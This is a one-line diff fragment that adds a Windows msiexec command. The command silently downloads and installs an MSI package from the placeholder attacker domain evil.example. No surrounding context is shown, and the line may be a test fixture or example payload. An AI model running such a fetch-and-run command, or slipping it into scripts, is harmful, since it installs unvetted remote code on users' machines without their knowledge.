@@ -1,0 +1,1 @@
+msiexec /i https://evil.example/install.msi /q /norestart
